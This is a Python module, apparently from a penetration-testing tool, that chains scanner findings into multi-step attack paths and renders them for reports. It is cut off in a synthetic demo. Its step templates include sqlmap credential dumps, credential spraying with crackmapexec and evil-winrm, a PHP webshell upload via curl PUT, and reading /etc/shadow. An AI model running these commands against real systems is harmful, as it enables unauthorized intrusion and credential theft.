"""
StrikeARC — Attack Chain Composition Engine
==========================================
Combines individual :class:`AttackVector` findings into multi-step kill
chains.  A *chain* shows the operator HOW a series of independent findings
can be linked into a full compromise path — e.g.::

    SQLi on .88 → dump users table → SSH creds → login to .231 → internal pivot

This is what separates a scanner (lists findings) from a professional
pentest tool (shows exploitation paths).

Design
------
* Pure-logic module — no imports from other project modules.  Takes the
  already-collected data structures (:class:`AttackVector`,
  ``Credential``-like dicts, ``hosts`` dict, ``topology`` dict) and reasons
  over them.
* Stdlib only: ``typing``, ``re``, ``itertools``.
* Every ``_chain_*`` function returns ``List[AttackChain]`` so callers can
  merge the results.

Data shapes (mirrors state.py)
------------------------------
AttackVector fields used: id, target, category, vector_type, title,
description, confidence, score, evidence, exploit_suggestions,
prerequisites, cves, references.

Credential dict fields used: username, password, hash, source_host,
source_service, valid_on (List[str] of ``host:port`` where confirmed).

``hosts`` is ``Dict[str, NetworkHost]``.  ``topology`` is a dict with at
least ``edges`` (List[NetworkEdge]) and optionally ``domains``.
"""

from __future__ import annotations

import hashlib
import itertools
import re
from typing import Any, Dict, List, Optional, Sequence, Tuple

# ── Type aliases & chain data models ───────────────────────────────────
#
# We mirror the AttackVector shape without importing it (this module is a
# pure-logic island).  ``AttackVector`` here is just ``Dict[str, Any]``
# with the well-known keys documented in state.py.

AttackVector = Dict[str, Any]

# Public TypedDict-style structures.  We use plain dicts + type aliases so
# the module works on Python 3.8+ without requiring TypedDict to be
# subclassable across versions.


class AttackStep(Dict[str, Any]):
    """A single action within an attack chain.

    Fields:
        vector_id:     ID of the AttackVector this step exploits ("" if the
                       step is a derived/manual action like cred reuse).
        target:        host:port, URL, or IP the step targets.
        action:        Human description of the action.
        tool:          Suggested tool/command to perform the action.
        expected_result: What success looks like for this step.
    """


class AttackChain(Dict[str, Any]):
    """A multi-step compromise path.

    Fields:
        id:              Stable hash-based chain ID.
        name:            Short headline, e.g.
                         ``"SQLi on .88 → Cred Dump → SSH to .231"``.
        steps:           Ordered list of :class:`AttackStep`.
        probability:     0.0–1.0 likelihood the full chain succeeds.
        impact:          One of: ``shell``, ``creds``, ``data``, ``pivot``,
                         ``domain`` (or ``+``-joined combo, e.g. ``"shell+pivot"``).
        kill_chain_phase: Final phase reached — ``initial_access``,
                         ``execution``, ``credential_access``, ``lateral``,
                         ``discovery``, ``impact``.
    """


# ── Confidence → numeric helper ────────────────────────────────────────

_CONF_NUMERIC = {"high": 0.9, "medium": 0.6, "low": 0.3}


def _conf_to_prob(confidence: str, fallback_score: int = 50) -> float:
    """Convert a confidence label (or score 0–100) to a 0–1 probability."""
    c = (confidence or "").strip().lower()
    if c in _CONF_NUMERIC:
        return _CONF_NUMERIC[c]
    # Fall back to a linear mapping from the 0-100 score.
    try:
        return max(0.0, min(1.0, float(fallback_score) / 100.0))
    except (TypeError, ValueError):
        return 0.5


def _chain_probability(scores: Sequence[int], confidences: Sequence[str]) -> float:
    """Combined probability of a chain.

    Probability of *all* steps succeeding = product of per-step
    probabilities, discounted slightly for chain length (each extra hop
    adds operational risk that isn't captured in a finding's confidence).
    """
    if not scores and not confidences:
        return 0.0
    probs: List[float] = []
    for score, conf in itertools.zip_longest(
        scores or [50], confidences or ["medium"], fillvalue=50 if scores else "medium"
    ):
        # Prefer the explicit confidence label; score is the fallback.
        if conf and str(conf).strip().lower() in _CONF_NUMERIC:
            probs.append(_conf_to_prob(str(conf)))
        else:
            probs.append(_conf_to_prob("", fallback_score=int(score) if score else 50))
    if not probs:
        return 0.0
    # Length penalty: each step beyond the first multiplies by 0.92.
    product = 1.0
    for i, p in enumerate(probs):
        product *= p
        if i > 0:
            product *= 0.92
    return round(max(0.0, min(1.0, product)), 3)


def _prob_label(p: float) -> str:
    """0–1 probability → LOW/MEDIUM/HIGH/CRITICAL label."""
    if p >= 0.75:
        return "HIGH"
    if p >= 0.45:
        return "MEDIUM"
    return "LOW"


def _make_chain_id(name: str, targets: Sequence[str]) -> str:
    raw = f"{name}|{'|'.join(targets)}".encode("utf-8", errors="ignore")
    return "chain_" + hashlib.sha256(raw).hexdigest()[:10]


def _host_from_target(target: str) -> str:
    """Extract the bare host/IP from a ``host:port`` or URL target string."""
    if not target:
        return ""
    t = target.strip()
    # URL form
    m = re.match(r"^\w+://([^/:?#]+)", t)
    if m:
        return m.group(1)
    # host:port or host form
    if ":" in t:
        host = t.rsplit(":", 1)[0]
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host):
            return host
    # plain IP
    m = re.match(r"^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", t)
    if m:
        return m.group(1)
    return t


def _short_host(ip: str) -> str:
    """Last octet for compact chain names: ``10.10.10.231`` → ``.231``."""
    m = re.search(r"(\d{1,3})$", ip or "")
    return f".{m.group(1)}" if m else (ip or "?")


def _services_on(host: dict) -> Dict[str, dict]:
    """Flatten a NetworkHost's services dict ({port: ServiceInfo}) into
    a ``{service_name: ServiceInfo}`` map keyed by service name."""
    out: Dict[str, dict] = {}
    for _port, svc in (host or {}).get("services", {}).items():
        if not isinstance(svc, dict):
            continue
        name = (svc.get("service") or "").lower()
        if name:
            out[name] = svc
    return out


def _vectors_for_host(vectors: Sequence[AttackVector], host_ip: str) -> List[AttackVector]:
    """Return vectors whose target resolves to ``host_ip``."""
    out: List[AttackVector] = []
    for v in vectors:
        if not isinstance(v, dict):
            continue
        if _host_from_target(v.get("target", "")) == host_ip:
            out.append(v)
    return out


def _has_vector_type(vectors: Sequence[AttackVector], vtype: str) -> bool:
    return any(
        isinstance(v, dict) and (v.get("vector_type") or "").lower() == vtype.lower()
        for v in vectors
    )


def _vectors_of_type(vectors: Sequence[AttackVector], vtype: str) -> List[AttackVector]:
    return [
        v for v in vectors
        if isinstance(v, dict) and (v.get("vector_type") or "").lower() == vtype.lower()
    ]


# ═══════════════════════════════════════════════════════════════════════
# PUBLIC ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════

def compose_chains(
    vectors: List[AttackVector],
    credentials: List[dict],
    hosts: dict,
    topology: Optional[dict] = None,
) -> List[AttackChain]:
    """Main orchestrator.

    Analyzes all attack vectors, credentials, hosts, and network topology
    to identify multi-step attack paths.  Runs each chaining strategy and
    returns a de-duplicated, probability-sorted list of chains.

    Args:
        vectors:     All discovered AttackVector dicts.
        credentials: List of credential dicts (see module docstring).
        hosts:       ``Dict[str, NetworkHost]`` keyed by host IP.
        topology:    Optional topology dict with ``edges`` and ``domains``.

    Returns:
        ``List[AttackChain]`` sorted by probability (highest first).
    """
    topology = topology or {}
    chains: List[AttackChain] = []

    # Defensive copies so we never mutate caller data.
    vectors = [v for v in vectors if isinstance(v, dict)]
    credentials = [c for c in credentials if isinstance(c, dict)]
    safe_hosts = {ip: h for ip, h in (hosts or {}).items() if isinstance(h, dict)}

    # Run each chaining strategy.
    chains.extend(_chain_sqli_to_creds(vectors, credentials, safe_hosts))
    chains.extend(_chain_cred_reuse(credentials, safe_hosts))
    chains.extend(_chain_cve_to_shell(vectors, safe_hosts))
    chains.extend(_chain_multivector_host(vectors, safe_hosts))
    chains.extend(_chain_cert_to_vhost(safe_hosts))
    chains.extend(_chain_webshell_rce(vectors, safe_hosts))
    chains.extend(_chain_cert_to_vhost_topology(topology, safe_hosts))

    # De-duplicate by ID, then sort by probability desc, then impact richness.
    seen: Dict[str, AttackChain] = {}
    for ch in chains:
        cid = ch.get("id") or _make_chain_id(ch.get("name", ""), [])
        ch["id"] = cid
        # Keep the first occurrence; if a later one has more steps, prefer it.
        if cid not in seen:
            seen[cid] = ch
        elif len(ch.get("steps", [])) > len(seen[cid].get("steps", [])):
            seen[cid] = ch

    result = list(seen.values())
    # Sort: probability desc, then more steps first.
    result.sort(key=lambda c: (c.get("probability", 0.0), len(c.get("steps", []))), reverse=True)
    return result


# ═══════════════════════════════════════════════════════════════════════
# CHAIN STRATEGY 1: SQLi → credential dump → service login
# ═══════════════════════════════════════════════════════════════════════

def _chain_sqli_to_creds(
    vectors: List[AttackVector],
    credentials: List[dict],
    hosts: dict,
) -> List[AttackChain]:
    """SQLi → dump users table → use creds for SSH / admin panels.

    For each SQLi vector we:
      1. Propose dumping the users/credentials table.
      2. If credentials were actually discovered on the same host, chain
         into logging into any SSH/admin service on *any* host.
      3. Otherwise, propose the cred-reuse step as a *potential* follow-on
         (lower probability).
    """
    chains: List[AttackChain] = []
    sqli_vectors = _vectors_of_type(vectors, "sqli")
    if not sqli_vectors:
        return chains

    # Index credentials by source host for quick lookup.
    creds_by_host: Dict[str, List[dict]] = {}
    for c in credentials:
        sh = c.get("source_host") or _host_from_target(c.get("source_service", ""))
        creds_by_host.setdefault(sh, []).append(c)

    for sqli in sqli_vectors:
        sqli_host = _host_from_target(sqli.get("target", ""))
        sqli_short = _short_host(sqli_host)
        sqli_target = sqli.get("target", sqli_host)

        steps: List[AttackStep] = []

        # Step 1 — exploit the SQLi to dump credentials.
        suggestions = sqli.get("exploit_suggestions") or []
        dump_cmd = next(
            (s for s in suggestions if "dump" in (s or "").lower()),
            f"sqlmap -u '{sqli_target}' --dump --batch",
        )
        steps.append(AttackStep(
            vector_id=sqli.get("id", ""),
            target=sqli_target,
            action=f"Exploit SQLi ({sqli.get('title', 'injection point')}) and dump user tables",
            tool=dump_cmd,
            expected_result="Plaintext or hashed credentials from users table",
        ))

        # Step 2 — extract/identify credentials.
        found_creds = creds_by_host.get(sqli_host, [])
        step2_action = "Find credentials in users table (hashes/plaintext)"
        if found_creds:
            sample = found_creds[0]
            step2_action = (
                f"Credentials recovered: "
                f"{sample.get('username', '?')} "
                f"({'hash' if sample.get('hash') else 'password' if sample.get('password') else 'unknown'})"
            )
        steps.append(AttackStep(
            vector_id="",
            target=sqli_target,
            action=step2_action,
            tool="crackstation / hashcat -m <type> hashes.txt" if found_creds else "manual review of dumped rows",
            expected_result="Valid username + password pairs",
        ))

        # Step 3 — use creds against a reachable SSH/admin service.
        host_creds = found_creds or credentials  # prefer host-specific, else any
        cred_for_reuse = host_creds[0] if host_creds else None
        username = (cred_for_reuse or {}).get("username", "admin")

        # Find an SSH or admin service on a *different* host.
        login_target_host = ""
        login_target_service = ""
        login_cmd = ""
        for ip, h in hosts.items():
            if ip == sqli_host and not found_creds:
                # Only skip same-host unless we actually found creds there.
                continue
            svcs = _services_on(h)
            if "ssh" in svcs:
                port = svcs["ssh"].get("port", 22)
                login_target_host = ip
                login_target_service = f"ssh/{port}"
                login_cmd = f"ssh {username}@{ip}   (then test all dumped creds)"
                break
            if "http" in svcs or "https" in svcs:
                proto = "https" if "https" in svcs else "http"
                port = svcs[proto].get("port", 443 if proto == "https" else 80)
                login_target_host = ip
                login_target_service = f"{proto}/{port}"
                login_cmd = f"Login to admin panel at {proto}://{ip}:{port}/ as {username}"
                break

        if login_target_host:
            steps.append(AttackStep(
                vector_id="",
                target=f"{login_target_host}:{login_target_service}",
                action=f"Log in to {login_target_service} on {_short_host(login_target_host)} with dumped creds",
                tool=login_cmd,
                expected_result="Authenticated access / interactive shell",
            ))

        # Assemble chain.
        tail = f"SSH to {login_target_host}" if login_target_host and "ssh" in login_target_service else (
            f"admin panel on {login_target_host}" if login_target_host else "credential reuse"
        )
        name = f"SQLi on {sqli_short} → Cred Dump → {tail}"
        if login_target_host and login_target_host != sqli_host:
            name += " → Pivot"

        scores = [sqli.get("score", 55)]
        confs = [sqli.get("confidence", "medium")]
        # If we have real creds, the chain is more likely to land.
        if found_creds:
            scores.append(80)
            confs.append("high")
        else:
            scores.append(40)
            confs.append("low")
        if login_target_host:
            scores.append(70)
            confs.append("medium")

        prob = _chain_probability(scores, confs)
        impact = "shell+creds" if login_target_host else "creds"

        chains.append(AttackChain(
            id=_make_chain_id(name, [sqli_host, login_target_host]),
            name=name,
            steps=steps,
            probability=prob,
            impact=impact,
            kill_chain_phase="credential_access" if login_target_host else "initial_access",
        ))

    return chains


# ═══════════════════════════════════════════════════════════════════════
# CHAIN STRATEGY 2: Credential reuse across hosts
# ═══════════════════════════════════════════════════════════════════════

def _chain_cred_reuse(
    credentials: List[dict],
    hosts: dict,
) -> List[AttackChain]:
    """Valid creds on host A → try them on every other host's services.

    Looks for credentials that are confirmed valid somewhere
    (``valid_on`` non-empty) and proposes spraying them against all
    reachable SSH/SMB/WinRM/HTTP-admin services on other hosts.
    """
    chains: List[AttackChain] = []
    if not credentials or not hosts:
        return chains

    for cred in credentials:
        username = cred.get("username", "") or ""
        password = cred.get("password", "")
        has_hash = bool(cred.get("hash"))
        if not username:
            continue
        # Need *something* to spray.
        if not password and not has_hash and not cred.get("hash"):
            continue

        valid_on = cred.get("valid_on") or []
        source_host = cred.get("source_host") or _host_from_target(
            cred.get("source_service", "")
        )

        # Build the list of target services on OTHER hosts.
        targets: List[Tuple[str, str, str, str]] = []  # (ip, service_label, cmd, vector_type)
        for ip, h in hosts.items():
            if ip == source_host and not valid_on:
                continue
            svcs = _services_on(h)
            if "ssh" in svcs:
                port = svcs["ssh"].get("port", 22)
                cmd = f"ssh {username}@{ip} -p {port}"
                targets.append((ip, f"ssh/{port}", cmd, "ssh"))
            if "smb" in svcs or "microsoft-ds" in svcs:
                cmd = f"crackmapexec smb {ip} -u '{username}' -p '<pass>'"
                targets.append((ip, "smb/445", cmd, "smb"))
            if "winrm" in svcs or "microsoft-ds" in svcs:
                cmd = f"evil-winrm -u '{username}' -p '<pass>' -i {ip}"
                targets.append((ip, "winrm/5985", cmd, "winrm"))
            if "http" in svcs:
                port = svcs["http"].get("port", 80)
                cmd = f"Login to admin panel http://{ip}:{port}/ as {username}"
                targets.append((ip, f"http/{port}", cmd, "web_admin"))
            if "https" in svcs:
                port = svcs["https"].get("port", 443)
                cmd = f"Login to admin panel https://{ip}:{port}/ as {username}"
                targets.append((ip, f"https/{port}", cmd, "web_admin"))

        if not targets:
            continue

        # Group targets into a single chain for the credential.
        steps: List[AttackStep] = [
            AttackStep(
                vector_id="",
                target=source_host or "discovered",
                action=(
                    f"Credential obtained: {username} "
                    f"({'hash' if has_hash else 'plaintext'}) from {source_host or 'enumeration'}"
                ),
                tool=(
                    "hashcat -m <type> hashes.txt" if has_hash
                    else "cred is already plaintext"
                ),
                expected_result="Usable credential pair",
            )
        ]
        spray_targets: List[str] = []
        for ip, svc_label, cmd, _vt in targets:
            steps.append(AttackStep(
                vector_id="",
                target=f"{ip}:{svc_label}",
                action=f"Spray cred on {svc_label} of {_short_host(ip)}",
                tool=cmd,
                expected_result="Authenticated access on target host",
            ))
            spray_targets.append(ip)

        head = f"Cred Reuse: {username}"
        tail_hosts = ", ".join(_short_host(t) for t in spray_targets[:3])
        if len(spray_targets) > 3:
            tail_hosts += f", +{len(spray_targets) - 3}"
        name = f"{head} → {tail_hosts}"

        # Probability: base cred validity × spray success rate (low per-target).
        base = 0.7 if valid_on else 0.4
        # Probability of at least one spray succeeding across N targets.
        per_target = 0.25
        at_least_one = 1.0 - (1.0 - per_target) ** len(spray_targets)
        prob = round(base * at_least_one, 3)

        chains.append(AttackChain(
            id=_make_chain_id(name, [source_host] + spray_targets),
            name=name,
            steps=steps,
            probability=prob,
            impact="lateral+creds",
            kill_chain_phase="lateral",
        ))

    return chains


# ═══════════════════════════════════════════════════════════════════════
# CHAIN STRATEGY 3: Critical CVE → exploit → shell → internal enum
# ═══════════════════════════════════════════════════════════════════════

def _chain_cve_to_shell(
    vectors: List[AttackVector],
    hosts: dict,
) -> List[AttackChain]:
    """Critical CVE → exploit → shell → enumerate internal networks.

    For any vector carrying a CVE with a high score (≥80), build a chain:
    exploit → shell → post-exploit enumeration → (optional) pivot.
    """
    chains: List[AttackChain] = []
    for v in vectors:
        cves = v.get("cves") or []
        score = int(v.get("score", 0) or 0)
        # Treat critical-CVE vectors (any CVE + high score) as chain seeds.
        is_critical = bool(cves and any(
            isinstance(c, str) and c.strip() and c.upper() != "N/A" for c in cves
        )) and score >= 80
        # Also accept high-confidence RCE/known_cve vectors even without a CVE id.
        if not is_critical:
            vt = (v.get("vector_type") or "").lower()
            if vt in ("known_cve", "rce") and score >= 85:
                is_critical = True
        if not is_critical:
            continue

        host_ip = _host_from_target(v.get("target", ""))
        host_short = _short_host(host_ip)
        target = v.get("target", host_ip)
        cve_str = ", ".join(c for c in cves if isinstance(c, str) and c.strip()) or "critical CVE"

        suggestions = v.get("exploit_suggestions") or []
        exploit_cmd = suggestions[0] if suggestions else (
            f"# exploit {cve_str} per public PoC / msfconsole"
        )

        steps: List[AttackStep] = [
            AttackStep(
                vector_id=v.get("id", ""),
                target=target,
                action=f"Exploit {cve_str} — {v.get('title', 'critical CVE')}",
                tool=exploit_cmd,
                expected_result="Remote code execution → interactive shell",
            ),
            AttackStep(
                vector_id="",
                target=host_ip,
                action="Stabilize shell & enumerate local system (whoami, id, uname -a)",
                tool="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  &&  id; uname -a",
                expected_result="Interactive shell as service account",
            ),
            AttackStep(
                vector_id="",
                target=host_ip,
                action="Enumerate internal networks & credentials",
                tool="ip a; ip route; find / -name '*.conf' 2>/dev/null | head",
                expected_result="New subnets + credential files for pivot",
            ),
        ]

        # If topology knows about other reachable hosts, add a pivot step.
        host_obj = hosts.get(host_ip, {})
        discovered_subnets = (host_obj.get("discovered_subnets") or []) if isinstance(host_obj, dict) else []
        if discovered_subnets:
            steps.append(AttackStep(
                vector_id="",
                target=host_ip,
                action=f"Pivot into discovered subnets: {', '.join(discovered_subnets[:3])}",
                tool="proxychains nmap -sn <subnet>",
                expected_result="New internal host discovery",
            ))

        tail = "Internal Pivot" if discovered_subnets else "Internal Enum"
        name = f"CVE {cve_str} on {host_short} → Shell → {tail}"

        scores = [score, 80, 70] + ([65] if discovered_subnets else [])
        confs = [v.get("confidence", "high"), "high", "medium"] + (["medium"] if discovered_subnets else [])
        prob = _chain_probability(scores, confs)
        impact = "shell+pivot" if discovered_subnets else "shell"

        chains.append(AttackChain(
            id=_make_chain_id(name, [host_ip]),
            name=name,
            steps=steps,
            probability=prob,
            impact=impact,
            kill_chain_phase="impact" if discovered_subnets else "execution",
        ))

    return chains


# ═══════════════════════════════════════════════════════════════════════
# CHAIN STRATEGY 4: Multi-vector host — combine co-located findings
# ═══════════════════════════════════════════════════════════════════════

def _chain_multivector_host(
    vectors: List[AttackVector],
    hosts: dict,
) -> List[AttackChain]:
    """Host has SQLi + missing CSP + file upload → XSS steal + SQLi dump + webshell.

    A single host carrying 3+ distinct vector types represents a
    compound attack surface.  We build a chain that chains the strongest
    vectors together (XSS for session theft → SQLi for creds → upload for shell).
    """
    chains: List[AttackChain] = []
    for ip, host in hosts.items():
        hv = _vectors_for_host(vectors, ip)
        # Need at least 3 distinct vector types to be worth a compound chain.
        vtypes = {(v.get("vector_type") or "").lower() for v in hv}
        vtypes.discard("")
        if len(vtypes) < 3 or len(hv) < 3:
            continue

        # Rank the host's vectors by score for ordering.
        ranked = sorted(hv, key=lambda v: int(v.get("score", 0) or 0), reverse=True)
        steps: List[AttackStep] = []
        actions_summary: List[str] = []

        # Build a step per selected vector (cap at 4 to keep chains readable).
        for v in ranked[:4]:
            vt = (v.get("vector_type") or "").lower()
            suggestion = (v.get("exploit_suggestions") or ["manual exploit"])[0]
            action_label = {
                "sqli": "Exploit SQLi to dump credentials",
                "xss": "Steal session cookie via stored XSS (no CSP)",
                "config_exposure": "Read exposed config for secrets",
                "info_disclosure": "Collect leaked debug info",
                "known_cve": f"Exploit {v.get('title', 'CVE')}",
                "file_upload": "Upload webshell via unrestricted file upload",
                "default_creds": "Login with default credentials",
                "rce": "Trigger remote code execution",
            }.get(vt, v.get("title", "Exploit vector"))
            steps.append(AttackStep(
                vector_id=v.get("id", ""),
                target=v.get("target", ip),
                action=action_label,
                tool=suggestion,
                expected_result=v.get("description", "Compromise of host"),
            ))
            actions_summary.append(action_label)

        host_short = _short_host(ip)
        name = f"Multi-Vector on {host_short}: {' + '.join(actions_summary[:3])}"

        scores = [int(v.get("score", 50) or 50) for v in ranked[:4]]
        confs = [v.get("confidence", "medium") for v in ranked[:4]]
        prob = _chain_probability(scores, confs)

        # Determine impact: if there's an RCE/upload/default_cred → shell.
        has_shell_path = any(
            (v.get("vector_type") or "").lower() in ("rce", "file_upload", "default_creds", "known_cve")
            for v in ranked[:4]
        )
        impact = "shell+creds+data" if has_shell_path else "creds+data"

        chains.append(AttackChain(
            id=_make_chain_id(name, [ip]),
            name=name,
            steps=steps,
            probability=prob,
            impact=impact,
            kill_chain_phase="execution" if has_shell_path else "initial_access",
        ))

    return chains


# ═══════════════════════════════════════════════════════════════════════
# CHAIN STRATEGY 5: SSL cert → vhost discovery → new attack surface
# ═══════════════════════════════════════════════════════════════════════

def _chain_cert_to_vhost(hosts: dict) -> List[AttackChain]:
    """SSL cert reveals domain/vhost → vhost brute-force → new web apps.

    Examines host findings and SSL cert info stored on the host for
    domain names / SAN entries that imply additional virtual hosts.
    """
    chains: List[AttackChain] = []
    for ip, host in hosts.items():
        domains: List[str] = []
        findings = (host.get("findings") or []) if isinstance(host, dict) else []
        for f in findings:
            if not isinstance(f, dict):
                continue
            detail = (f.get("detail") or "") + " " + (f.get("raw_data") or "")
            detail = detail.lower()
            # Look for CN= / SAN= / domain indicators in findings.
            for m in re.finditer(r"\b(?:cn|san|subject_cn|subject_org)\s*[:=]\s*([a-z0-9.\-]+)", detail):
                val = m.group(1)
                if "." in val and not val.isdigit():
                    domains.append(val)
            for m in re.finditer(r"\b([a-z0-9\-]+(?:\.[a-z0-9\-]+){1,4})\b", detail):
                val = m.group(1)
                # Filter to plausible FQDNs (avoid IPs and single words).
                if val.count(".") >= 1 and not re.match(r"^\d+\.\d+\.\d+\.\d+$", val):
                    if val not in ("example.com", "localhost"):
                        domains.append(val)

        # Also check an explicit ssl/cert info blob if present.
        cert_info = host.get("ssl_info") or host.get("cert") if isinstance(host, dict) else None
        if isinstance(cert_info, dict):
            cn = cert_info.get("subject_cn") or ""
            if cn and "." in cn:
                domains.append(cn)
            for san in (cert_info.get("san_list") or []):
                if isinstance(san, str) and "." in san:
                    domains.append(san)

        # De-dup and filter to non-wildcard base domains (keep wildcards' base).
        clean: List[str] = []
        seen_d = set()
        for d in domains:
            base = d.lstrip("*.").strip().lower()
            if base and base not in seen_d and "." in base:
                seen_d.add(base)
                clean.append(base)
        if not clean:
            continue

        domain_str = clean[0]
        host_short = _short_host(ip)
        steps: List[AttackStep] = [
            AttackStep(
                vector_id="",
                target=ip,
                action=f"Extract domain from SSL cert / findings: {domain_str}",
                tool=f"openssl s_client -connect {ip}:443 | openssl x509 -noout -text",
                expected_result=f"Domain name {domain_str} (and SANs)",
            ),
            AttackStep(
                vector_id="",
                target=ip,
                action=f"Brute-force vhosts for {domain_str}",
                tool=f"ffuf -u http://{ip} -H 'Host: FUZZ.{domain_str}' -w subdomains.txt",
                expected_result="List of responding virtual hosts",
            ),
            AttackStep(
                vector_id="",
                target=domain_str,
                action="Enumerate each discovered vhost (web apps, APIs, logins)",
                tool="gobuster dir + nikto per vhost",
                expected_result="New web attack surface / login portals",
            ),
        ]

        if len(clean) > 1:
            steps.append(AttackStep(
                vector_id="",
                target=ip,
                action=f"Additional domains from cert: {', '.join(clean[1:4])}",
                tool="repeat vhost enumeration per domain",
                expected_result="Broader attack surface",
            ))

        name = f"SSL Cert on {host_short} → vhost {domain_str} → New Apps"
        prob = _chain_probability([70, 60, 65], ["medium", "medium", "medium"])

        chains.append(AttackChain(
            id=_make_chain_id(name, [ip]),
            name=name,
            steps=steps,
            probability=prob,
            impact="domain",
            kill_chain_phase="discovery",
        ))

    return chains


def _chain_cert_to_vhost_topology(topology: dict, hosts: dict) -> List[AttackChain]:
    """Topology-aware variant: if topology exposes known domains, seed vhost chains.

    This complements :func:`_chain_cert_to_vhost` by also considering an
    explicit ``topology['domains']`` list, so callers that pass topology
    separately still get vhost-discovery chains even when host findings
    don't carry cert data inline.
    """
    chains: List[AttackChain] = []
    domains = (topology or {}).get("domains") or []
    if not domains or not hosts:
        return chains
    # Pick the first HTTPS host as the vhost-brute target.
    https_hosts = [
        ip for ip, h in hosts.items()
        if isinstance(h, dict) and ("https" in _services_on(h) or "ssl" in _services_on(h))
    ]
    if not https_hosts:
        return chains
    ip = https_hosts[0]
    host_short = _short_host(ip)
    for domain in domains[:3]:
        domain = str(domain).strip().lower()
        if not domain or "." not in domain:
            continue
        steps: List[AttackStep] = [
            AttackStep(
                vector_id="",
                target=ip,
                action=f"Known domain {domain} → enumerate vhosts on {host_short}",
                tool=f"ffuf -u http://{ip} -H 'Host: FUZZ.{domain}' -w subdomains.txt",
                expected_result="Virtual hosts responding for this domain",
            ),
            AttackStep(
                vector_id="",
                target=domain,
                action=f"Deep-enumerate discovered vhosts under {domain}",
                tool="gobuster dir + nuclei per vhost",
                expected_result="New web apps & vulnerabilities",
            ),
        ]
        name = f"Domain {domain} (topology) → vhost enum on {host_short}"
        prob = _chain_probability([70, 65], ["medium", "medium"])
        chains.append(AttackChain(
            id=_make_chain_id(name, [ip, domain]),
            name=name,
            steps=steps,
            probability=prob,
            impact="domain",
            kill_chain_phase="discovery",
        ))
    return chains


# ═══════════════════════════════════════════════════════════════════════
# CHAIN STRATEGY 6 (bonus): Web shell upload → RCE → post-exploit
# ═══════════════════════════════════════════════════════════════════════

def _chain_webshell_rce(
    vectors: List[AttackVector],
    hosts: dict,
) -> List[AttackChain]:
    """Web shell upload (PUT method / unrestricted upload) → RCE → post-exploit.

    Covers Tomcat PUT, unrestricted file upload, and similar vectors whose
    type suggests dropping a web shell.
    """
    chains: List[AttackChain] = []
    upload_types = {"file_upload", "put_method", "webshell_upload"}
    for v in vectors:
        vt = (v.get("vector_type") or "").lower()
        title = (v.get("title") or "").lower()
        is_upload = vt in upload_types or "upload" in title or "put method" in title
        if not is_upload:
            continue
        host_ip = _host_from_target(v.get("target", ""))
        host_short = _short_host(host_ip)
        target = v.get("target", host_ip)
        suggestions = v.get("exploit_suggestions") or []
        upload_cmd = suggestions[0] if suggestions else (
            "curl -X PUT 'http://target/shell.php/' -d '<?php system($_GET[\"c\"]);?>'"
        )

        steps: List[AttackStep] = [
            AttackStep(
                vector_id=v.get("id", ""),
                target=target,
                action=f"Upload webshell via {v.get('title', 'unrestricted upload')}",
                tool=upload_cmd,
                expected_result="Executable webshell at a known URL",
            ),
            AttackStep(
                vector_id="",
                target=target,
                action="Trigger webshell for RCE",
                tool=f"curl '{target.rstrip('/')}/shell.php?c=id'",
                expected_result="Command output → confirmed RCE",
            ),
            AttackStep(
                vector_id="",
                target=host_ip,
                action="Escalate to interactive shell & enumerate",
                tool="reverse shell one-liner → id; sudo -l; cat /etc/shadow",
                expected_result="Root or service-account shell + creds",
            ),
        ]

        name = f"Webshell Upload on {host_short} → RCE → Post-Exploit"
        scores = [int(v.get("score", 75) or 75), 85, 70]
        confs = [v.get("confidence", "high"), "high", "medium"]
        prob = _chain_probability(scores, confs)

        chains.append(AttackChain(
            id=_make_chain_id(name, [host_ip]),
            name=name,
            steps=steps,
            probability=prob,
            impact="shell+data",
            kill_chain_phase="execution",
        ))

    return chains


# ═══════════════════════════════════════════════════════════════════════
# REPORT FORMATTER
# ═══════════════════════════════════════════════════════════════════════

def format_chains_for_report(chains: List[AttackChain]) -> List[str]:
    """Format attack chains as markdown text for report inclusion.

    Each chain renders as a header line + numbered steps + a probability
    / impact summary line, matching the requested report format::

        Chain: SQLi on .88 → Cred Dump → SSH to .231 → Internal Pivot
        Step 1: Exploit SQLi (sqlmap --dump)
        Step 2: Find creds in users table
        Step 3: SSH to .231 with dumped creds
        Probability: HIGH | Impact: shell+pivot

    Returns:
        ``List[str]`` — one string per chain (multi-line), ready to be
        joined with ``\\n\\n`` in a report.
    """
    rendered: List[str] = []
    for ch in chains:
        name = ch.get("name", "Unnamed Chain")
        steps = ch.get("steps") or []
        prob = ch.get("probability", 0.0)
        impact = ch.get("impact", "unknown")
        phase = ch.get("kill_chain_phase", "")

        lines: List[str] = [f"**Chain: {name}**"]
        for i, step in enumerate(steps, start=1):
            action = step.get("action", "")
            tool = step.get("tool", "")
            target = step.get("target", "")
            # Compact step line: "Step N: action (tool)"
            step_line = f"Step {i}: {action}"
            if tool:
                # Truncate very long commands for readability.
                tool_short = tool if len(tool) <= 90 else tool[:87] + "..."
                step_line += f"  `{tool_short}`"
            if target and target not in action:
                step_line += f"  [→ {target}]"
            lines.append(step_line)

        prob_lbl = _prob_label(prob)
        lines.append(
            f"Probability: {prob_lbl} ({prob:.0%}) | Impact: {impact}"
            + (f" | Phase: {phase}" if phase else "")
        )
        rendered.append("\n".join(lines))
    return rendered


# ═══════════════════════════════════════════════════════════════════════
# CLI / self-test
# ═══════════════════════════════════════════════════════════════════════

def _demo() -> None:
    """Tiny self-test with synthetic data — run via ``python3 attack_chains.py``."""
    vectors: List[AttackVector] = [
        dict(
            id="sqli:aa11bb22", target="10.10.10.88:80",
            category="initial_access", vector_type="sqli",
            title="SQLi in param 'id'", description="union-based SQLi",
            confidence="high", score=90,
            evidence=["union reflected"], exploit_suggestions=[
                "sqlmap -u 'http://10.10.10.88/page?id=1' -p id --dump --batch",
                "sqlmap --os-shell",
            ], prerequisites=[], cves=[], references=[],
        ),
        dict(
            id="cve:cc33dd44", target="10.10.10.231:8080",
            category="initial_access", vector_type="known_cve",
            title="Tomcat PUT Method RCE", description="CVE-2017-12617",
            confidence="high", score=80,
            evidence=["tomcat/8.5 detected"], exploit_suggestions=[
                "curl -X PUT 'http://10.10.10.231:8080/shell.jsp/' -d @shell.jsp",
            ], prerequisites=[], cves=["CVE-2017-12617"], references=[],
        ),
        dict(
            id="xss:ee55ff66", target="10.10.10.88:80",
            category="initial_access", vector_type="xss",
